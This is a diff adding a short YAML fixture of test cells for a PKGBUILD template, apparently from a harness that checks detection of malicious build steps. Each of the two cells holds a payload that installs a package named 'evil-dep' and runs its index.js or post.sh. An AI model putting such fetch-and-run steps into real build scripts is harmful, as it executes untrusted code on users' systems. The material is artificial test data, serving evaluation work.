@@ -1,0 +1,16 @@
+template: template.PKGBUILD
+cells:
+- id: tools-npm-index
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: |
+      ./tools/node/bin/npm install evil-dep@1.2.3
+      node node_modules/evil-dep/index.js
+- id: ctl-plain-npm-index
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: |
+      npm install evil-dep@1.2.3
+      bash node_modules/evil-dep/post.sh
